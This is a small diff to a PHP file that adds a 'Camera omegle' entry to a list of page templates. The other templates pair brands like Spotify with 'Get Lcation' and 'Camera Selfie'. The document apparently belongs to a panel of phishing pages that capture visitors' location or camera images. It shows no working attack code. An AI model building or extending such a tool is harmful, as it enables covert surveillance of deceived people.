@@ -308,6 +308,7 @@ $userId = isset($_SESSION['user']['id']) ? $_SESSION['user']['id'] : (isset($_SE
             ['name' => 'Spotify', 'icon' => 'bi-spotify', 'bg_icon' => 'bg-green-700/40', 'folder' => 'spotify', 'desc' => 'Spotify Music'],
             ['name' => 'Location', 'icon' => 'bi-geo-alt-fill', 'bg_icon' => 'bg-red-800/40', 'folder' => 'wifi', 'desc' => 'Get Lcation'],
             ['name' => 'Camera', 'icon' => 'bi-camera-fill', 'bg_icon' => 'bg-yellow-800/40', 'folder' => 'photomath', 'desc' => 'Camera Selfie'],
+            ['name' => 'Camera omegle', 'icon' => 'bi-camera-video-fill', 'bg_icon' => 'bg-orange-800/40', 'folder' => 'omegle', 'desc' => 'Camera Selfie'],
             // ['name' => 'Telegram', 'icon' => 'bi-telegram', 'bg_icon' => 'bg-sky-900/40', 'folder' => 'telegram-acc', 'desc' => 'Channel & bot']
         ];
         
